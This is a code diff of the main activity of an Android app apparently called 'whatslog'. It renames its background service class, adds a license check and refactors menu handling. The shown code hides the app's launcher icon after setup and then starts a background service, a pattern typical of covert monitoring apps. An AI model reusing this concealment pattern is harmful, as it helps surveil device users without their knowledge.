@@ -11,9 +11,9 @@ import android.view.View;
 import android.widget.EditText;
 import android.widget.Toast;
 
-import com.android.whatslog.R;
 import com.j256.ormlite.android.apptools.OrmLiteBaseActivity;
-import com.whatslog.MyService;
+import com.whatslog.MainService;
+import com.whatslog.R;
 import com.whatslog.Utils;
 import com.whatslog.dao.DatabaseHelperConfiguracao;
 import com.whatslog.dao.DatabaseHelperInternal;
@@ -26,9 +26,14 @@ public class MainActivity extends OrmLiteBaseActivity<DatabaseHelperInternal> {
 	private EditText dialer;
 	private EditText subject;
 
+
+
+
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
+
+		Utils.verifyLicense(this);
 
 		if (isFirstTime()) {
 			setContentView(R.layout.conf);
@@ -45,31 +50,31 @@ public class MainActivity extends OrmLiteBaseActivity<DatabaseHelperInternal> {
 
 	@Override
 	public boolean onMenuItemSelected(int featureId, MenuItem item) {
-		switch (item.getItemId()) {
-		case R.id.action_settings:
+		int itemId = item.getItemId();
+		if (itemId == R.id.action_settings) {
 			Intent intent = new Intent(this, ConfActivity.class);
 			setIntent(intent);
 			startActivity(intent);
 			return true;
-		case R.id.show_icon:
+		} else if (itemId == R.id.show_icon) {
 			Utils.showIcon(true, this);
 			return true;
-		case R.id.hide_icon:
+		} else if (itemId == R.id.hide_icon) {
 			Utils.showIcon(false, this);
 			return true;
-		default:
+		} else {
 			return super.onMenuItemSelected(featureId, item);
 		}
 	}
 
 	// Start the service
 	public void startNewService(View view) {
-		startService(new Intent(this, MyService.class));
+		startService(new Intent(this, MainService.class));
 	}
 
 	// Stop the service
 	public void stopNewService(View view) {
-		stopService(new Intent(this, MyService.class));
+		stopService(new Intent(this, MainService.class));
 	}
 
 	private boolean isFirstTime() {
@@ -125,7 +130,7 @@ public class MainActivity extends OrmLiteBaseActivity<DatabaseHelperInternal> {
 				//hide icon
 				Utils.showIcon(false, this);
 
-				startService(new Intent(this, MyService.class));
+				startService(new Intent(this, MainService.class));
 
 				finish();
 
